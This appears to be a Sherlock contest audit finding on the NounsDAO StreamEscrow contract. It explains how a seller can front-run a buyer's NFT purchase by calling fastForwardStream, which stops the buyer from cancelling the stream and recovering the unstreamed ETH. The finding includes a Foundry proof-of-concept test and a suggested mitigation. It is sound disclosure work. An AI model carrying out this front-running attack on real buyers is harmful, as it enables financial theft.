# Malicious user can fast-forward streams to prevent stream cancellation for buyers

### Summary

The **fast-forward stream mechanism** will cause a financial loss for buyers as a malicious user can front-run the transfer of the token, execute [`fastForwardStream`](https://github.com/sherlock-audit/2024-11-nounsdao/blob/8b6fb94f103134e751cf016e5c3f4185be89bb49/nouns-monorepo/packages/nouns-contracts/contracts/StreamEscrow.sol#L188-L224), and significantly reduce the unstreamed funds available for cancellation. This exploitation takes advantage of the current stream design’s lack of synchronization during ownership transfer.

### Root Cause

The choice to allow stream fast-forwarding without considering ownership transfer synchronization is a mistake, as it enables malicious actors to front-run transfers and manipulate the stream balance unfairly.

### Internal pre-conditions

1.	**Malicious user** needs to win a high-value auction to establish a large stream.
2.	**Malicious user** needs to list the NFT for sale at a lower price to attract buyers.
3.	The **buyer** needs to initiate a token purchase and attempt to cancel the stream.

### External pre-conditions

1.	The **blockchain environment** must allow the malicious user to detect and front-run the buyer’s token purchase transaction.
2.	The `fastForwardStream` function must be callable during or immediately before a token transfer.

### Attack Path

1.	The **malicious user** bids an excessively high amount in the auction (e.g., 100 ETH), establishing a large stream (e.g., 80 ETH).
2.	The **malicious user** lists the purchased NFT for sale at a reduced price (e.g., 50 ETH).
3.	A **buyer** initiates a purchase transaction, intending to cancel the stream to recover unstreamed funds.
4.	The **malicious user** front-runs the transfer by calling `fastForwardStream`, reducing the remaining unstreamed funds.
5.	The **buyer** completes the purchase but cannot recover the expected unstreamed funds upon cancellation.

### Impact

The **buyer** suffers a financial loss of approximately the difference between the initial stream value and the accelerated stream value (e.g., up to 80 ETH). The **malicious user** gains by exploiting the buyer’s expectation of reclaiming unstreamed funds.

### PoC

Add this test contract as part of `nouns-monorepo/packages/nouns-contracts/test/foundry/StreamEscrow.t.sol`, then run using this command:

```bash
// if your not located in the `nouns-contracts` folder:
cd packages/nouns-contracts
forge test --match-contract  FastForwardStreamPoC  -vvv
```

```solidity

contract FastForwardStreamPoC is BaseStreamEscrowTest {
    function testFastForwardFrontRun() public {
        // Step 1: Malicious user wins auction
        vm.startPrank(streamCreator);
        uint256 nounId = 2;
        nounsToken.mint(streamCreator, nounId);
        escrow.forwardAllAndCreateStream{ value: 100 ether }({ nounId: nounId, streamLengthInTicks: 20 });
        nounsToken.transferFrom(streamCreator, user, nounId);
        vm.stopPrank();
        assertEq(escrow.getStream(2).lastTick, 20);
        assertEq(escrow.getStream(2).ethPerTick, 5 ether);
        
        // Step 2: Malicious user lists NFT for sale
        address buyer = makeAddr('buyer');
        uint256 purchasePrice = 50 ether;
        vm.deal(buyer, purchasePrice);

    
        // Step 3: Buyer initiates purchase
        bytes memory data = abi.encodeWithSignature("transferFrom(address,address,uint256)", user, buyer, nounId);
    
        // Step 4: Malicious user front-runs and fast-forwards stream
        vm.startPrank(user);
        escrow.fastForwardStream(nounId, escrow.getStream(nounId).lastTick - escrow.currentTick());

        // The buy transaction completed now
        (bool sent, ) = address(nounsToken).call(data);
        assert(sent);
        vm.stopPrank();
        vm.prank(buyer);
        payable(user).transfer(purchasePrice);

        // Step 5: Buyer cancels stream, expecting to recover unstreamed funds
        // It reverts with `stream not active` error
        vm.startPrank(buyer);
        nounsToken.approve(address(escrow), nounId);

        vm.expectRevert('stream not active');
        escrow.cancelStream(nounId);
        vm.stopPrank();

        assertEq(user.balance, purchasePrice);
        assertEq(buyer.balance, 0);
    }
}
```

### Mitigation

- Introduce a grace period post-transfer where fast-forwarding is disabled, giving the new owner time to cancel the stream.
